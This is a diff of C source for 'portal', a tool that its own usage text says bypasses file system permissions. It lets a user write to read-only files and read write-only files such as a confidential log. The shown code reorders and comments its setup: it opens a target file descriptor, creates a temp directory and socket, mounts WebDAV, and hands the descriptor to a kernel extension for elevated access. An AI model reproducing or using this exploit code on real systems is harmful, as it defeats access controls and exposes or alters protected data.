@@ -26,8 +26,8 @@
 #include "utils.h"
 
 #define DOC "\
-portal can bypass file system permissions assigned to a file \n\
-portal allows to write on readonly files and to read from write only files \n\
+Portal can bypass file system permissions assigned to a file \n\
+Portal allows to write on readonly files and to read from write only files \n\
 \n\
 Usage: portal [read|write] /path/to/target /path/to/source/or/destination \n \
 \n\
@@ -37,6 +37,8 @@ To copy payload.txt to readonly file protected.txt in $HOME directory \n \
 \n\
 To copy from writeonly file confidental_log.txt to log.txt in $HOME directory \n\
   portal read ~/confidential_log.txt ~/log.txt \n\
+\n\
+Portal needs to open file descriptor to target file. So it requires atleast read or write permission to target file\n\
 "
 
 /*
@@ -398,6 +400,23 @@ int main(int argc, char** argv) {
     return EINVAL;
   }
   
+  /*
+   Temporary files will be stored in TEMP_DIR/id directory
+   */
+  char id[NAME_MAX] = "XXXXXX";
+  if (mktemp(id) == NULL) {
+    printf("cannot create id, error: %d \n", errno);
+    goto done;
+  }
+  
+  char temp_dir[PATH_MAX];
+  snprintf(temp_dir, sizeof(temp_dir), "%s/%s", TEMP_DIR, id);
+  
+  /*
+   Portal needs file descriptor of the target file. To read from a
+   write only target, portal opens target file in write only mode. To
+   write to read only target, portal opens target file in read only mode.
+   */
   mode_t portal_mode;
   if (strncmp(argv[1], "read", 4) == 0) {
     portal_mode = O_WRONLY;
@@ -408,57 +427,56 @@ int main(int argc, char** argv) {
     return EINVAL;
   }
   
-  int error;
-  char id[NAME_MAX] = "XXXXXX";
-  if (mktemp(id) == NULL) {
-    printf("cannot create id, error: %d \n", errno);
-    goto done;
-  }
-  
-  // Ignore error. We will catch later
-  mkdir(TEMP_DIR, 0700);
-  
-  char temp_dir[PATH_MAX];
-  snprintf(temp_dir, sizeof(temp_dir), "%s/%s", TEMP_DIR, id);
-  if (mkdir(temp_dir, 0700) != 0) {
-    printf("cannot create temporary working directory, error: %d \n", errno);
-    goto done;
-  }
-  
   struct listen_thread_args args;
   bzero(&args, sizeof(args));
   
+  /* Target file */
   strlcpy(args.handler_ctx.target, argv[2], sizeof(args.handler_ctx.target));
+  
+  /* Open fd to target file. This fd will be passed to kext to get elevated access to target file */
   args.handler_ctx.target_fd = open(args.handler_ctx.target, portal_mode);
   if (args.handler_ctx.target_fd < 0) {
     printf("cannot open destination as readonly, error %d \n", errno);
     goto done;
   }
-    
+  
+  /* Path to unix domain socket file */
   snprintf(args.listen_addr.sun_path, sizeof(args.listen_addr.sun_path), "%s/socket.sock", temp_dir);
   args.listen_addr.sun_len = sizeof(args.listen_addr);
   args.listen_addr.sun_family = PF_LOCAL;
   
+  /* Path to root directory cache */
   char root_cache_path[PATH_MAX];
   bzero(root_cache_path, sizeof(root_cache_path));
   snprintf(root_cache_path, sizeof(root_cache_path), "%s/root_cache", temp_dir);
+  
+  /* Path to webdav mount */
+  char mnt_dir[PATH_MAX];
+  bzero(mnt_dir, sizeof(mnt_dir));
+  snprintf(mnt_dir, sizeof(mnt_dir), "%s/mount", temp_dir);
+  
+  /* Setup temporary directory */
+  mkdir(TEMP_DIR, 0700); // Next operation will fail if there is error
+  
+  if (mkdir(temp_dir, 0700) != 0) {
+    printf("cannot create temporary working directory, error: %d \n", errno);
+    goto done;
+  }
+  
+  if (mkdir(mnt_dir, 0700) != 0) {
+    printf("cannot create mount directory %s, error: %d \n", mnt_dir, errno);
+    goto done;
+  }
+  
   args.handler_ctx.root_dir_cache_fd = open(root_cache_path, O_CREAT | O_RDWR, 0700);
   if (args.handler_ctx.root_dir_cache_fd < 0) {
     printf("cannot create root cache, error: %d \n", errno);
     goto done;
   }
   
+  /* Write '.', '..' and 'portal' file entries to root directory */
   if (setup_root_fd(args.handler_ctx.root_dir_cache_fd) != 0) {
     printf("cannot setup root cache, error: %d \n", errno);
-    goto done;
-  }
-  
-  char mnt_dir[PATH_MAX];
-  bzero(mnt_dir, sizeof(mnt_dir));
-  snprintf(mnt_dir, sizeof(mnt_dir), "%s/mount", temp_dir);
-  
-  if (mkdir(mnt_dir, 0700) != 0) {
-    printf("cannot create mount directory %s, error: %d \n", mnt_dir, errno);
     goto done;
   }
   
@@ -470,19 +488,22 @@ int main(int argc, char** argv) {
     goto done;
   }
   
-  error = webdav_mount(&args.listen_addr, "portal_mnt", "portal_vol", mnt_dir);
-  if (error != 0) {
-    printf("cannot mount webdav, error: %d \n", error);
-    errno = error;
+  int result = webdav_mount(&args.listen_addr, "portal_mnt", "portal_vol", mnt_dir);
+  if (result != 0) {
+    printf("cannot mount webdav, error: %d \n", result);
+    errno = result;
     goto done;
   }
   
+  /* Wait for listner to initialize. */
   sleep(1);
   
+  /* Path to portal file inside webdav mount directory */
   char portal_path[PATH_MAX];
   bzero(portal_path, sizeof(portal_path));
   snprintf(portal_path, sizeof(portal_path), "%s/portal", mnt_dir);
   
+  /* Path to source (for write operation) / destination file (for read operation) */
   char src_dest_path[PATH_MAX];
   bzero(src_dest_path, sizeof(src_dest_path));
   strncpy(src_dest_path, argv[3], sizeof(src_dest_path));
